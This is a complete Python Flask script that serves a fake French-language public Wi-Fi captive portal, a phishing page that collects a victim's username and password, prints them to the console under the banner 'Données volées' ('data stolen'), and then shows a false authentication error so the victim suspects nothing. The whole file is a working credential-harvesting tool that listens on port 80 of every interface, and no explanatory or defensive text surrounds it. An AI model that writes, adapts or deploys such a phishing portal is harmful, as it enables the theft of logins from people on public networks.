from flask import Flask, render_template_string, request

app = Flask(__name__)

LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion Wi-Fi Public</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #333; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Portail Captif</h2>
        <p style="font-size: 0.8em; color: #666;">Veuillez vous authentifier pour accéder à Internet.</p>
        <form action="/login" method="post">
            <input type="text" name="user" placeholder="Nom d'utilisateur" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Accéder au Réseau</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('password')
    print(f"\n\033[91m[!] SUCCÈS ATTACLE : Données volées ! \033[0m")
    print(f"    User : {user} | Pass : {password}\n")
    return "<h1>Erreur d'authentification. Réessayez.</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)